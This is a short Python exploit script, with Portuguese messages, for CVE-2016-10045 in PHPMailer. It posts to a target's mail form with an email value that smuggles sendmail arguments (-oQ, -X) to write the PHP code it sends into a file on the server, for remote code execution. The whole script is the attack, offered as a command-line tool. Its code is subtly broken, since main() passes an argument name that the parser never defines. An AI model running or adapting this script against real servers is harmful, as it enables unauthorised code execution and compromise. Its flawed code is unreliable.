import requests
import argparse

def exploit(url, dir):
    payload = "\"attacker\\' -oQ/tmp/ -X%s/phpcode.php  some\"@email.com" % dir
    rce_php_code = "<?php phpinfo(); ?>"
    
    post_data = {'action': 'send', 'name': 'Instriq', 'email': payload, 'msg': rce_php_code}
    
    response = requests.post(url, data=post_data)
    
    if response.status_code == 200:
        print("Exploração bem-sucedida!")
    else:
        print("A exploração falhou.")

def main():
    parser = argparse.ArgumentParser(description='CVE-2016-10045 | PHPMailer')
    parser.add_argument('-t', '--target', required=True, help='URL do alvo')
    parser.add_argument('-d', '--dir', required=True, help='Diretório remoto de gravação')
    args = parser.parse_args()
    
    if args.target and args.dir:
        exploit(args.target, args.rw_dir)

if __name__ == '__main__':
    main()
